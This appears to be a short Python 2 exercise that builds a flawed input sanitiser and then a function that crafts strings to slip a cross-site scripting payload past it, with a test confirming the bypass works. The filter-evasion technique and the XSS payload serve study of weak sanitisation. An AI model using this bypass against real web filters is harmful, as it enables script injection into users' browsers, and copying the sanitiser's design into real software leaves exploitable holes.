import urllib

def validation(input_string):
    sanitizing = True
    while sanitizing:
        original = input_string
        print "Sanitizing: ", input_string
        input_string = input_string.replace("<script>", '')             
        input_string = input_string.replace("</script>", '')
        print "Removed script tags: ", input_string
        input_string = input_string[:50]
        input_string = input_string.replace("'", '').replace('"', '')
        print "Removed quotes: ", input_string
        if original == input_string:
            sanitizing = False        
        input_string = urllib.unquote_plus(input_string)
    return input_string
    
def bypass_validation(data):
    data = data.replace("<script>", "<script'>")
    data = data.replace("</script>", "</script'>")
    quote_char1 = urllib.quote_plus(" ")
    quote_char2 = urllib.quote_plus('"')
    data = data.replace("'", quote_char1)
    data = data.replace('"', quote_char2)    
    return data
    
def test_bypass_validation():
    target_string = '"><script>alert("foo")</script>'
    crafted_string = bypass_validation(target_string)
    output_string = validation(crafted_string)
    print crafted_string
    assert output_string == target_string, (target_string, output_string)
    
if __name__ == "__main__":
    test_bypass_validation()
    